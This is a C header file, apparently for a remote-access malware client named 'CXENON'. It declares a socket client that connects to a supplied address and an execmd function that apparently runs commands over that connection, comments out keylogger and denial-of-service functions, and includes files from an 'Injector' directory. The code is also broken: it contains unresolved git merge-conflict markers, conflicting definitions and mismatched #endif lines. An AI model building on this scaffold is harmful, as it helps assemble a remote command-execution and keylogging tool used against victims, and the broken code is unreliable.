#ifndef CXENONh_H
#define CXENONh_H


<<<<<<< HEAD
#include "../Include/driver/socket.h"
#include "../../../Injector/Dependencies/parse/parse.h"

=======
>>>>>>> 5f705d909d599db565c4af386cf2bfc55791323f
#define Exit -2
#define UNKNOWN 2
#define INADDR_NONE -1

#if defined(_WIN32)


int WININIT(void);
//      char* keylogger(void);
//      void DOS(void);


struct functionaddr
{
    
    SOCKET* (function_socket)(int af, int type, int protocol);
    int* (function_connect)(SOCKET s, const sockaddr* name, int namelen);
    int* (function_WSAcleanup)(void);
    int* (function_WSAstartup)(WORD wordedversion, LPWSADATA lpWSAData);
    
};


enum _USTATUS
{

	ONLINE=0x00,
	OFFLINE=0x01,
	UNKNOWN=0x02

};


typedef int SOCKET;
typedef unsigned short ushort;
typedef unsigned int uint32_t;


typedef SOCKET (socket)(int domain, int type, int protocol);
typedef int (connect)(int sockfd, const struct sockaddr* addr, size_t addrlen);


struct sockaddr
{
	ushort sa_family;
	char sa_data[14];
};

struct sockaddr_in
{
	short   sin_family;
	u_short sin_port;
	struct  in_addr sin_addr;
	char    sin_zero[8];
};


typedef struct
{

	int dstport;
	char* dstaddr;

} ClientCTX, *pClientCTX;

<<<<<<< HEAD
struct functionaddr GetFunctionVA(struct functionaddr* funcVA);
pClientCTX CliInit(const char* inetaddr, const int port);
=======

#endif

uint32_t inet_addr(const char* ip);
pClientCTX CliInit(void);
>>>>>>> 5f705d909d599db565c4af386cf2bfc55791323f
SOCKET client_socket(SOCKET Socket);
SOCKET client_conn(SOCKET Socket, pClientCTX CTX);
int execmd(SOCKET Socket);

#endif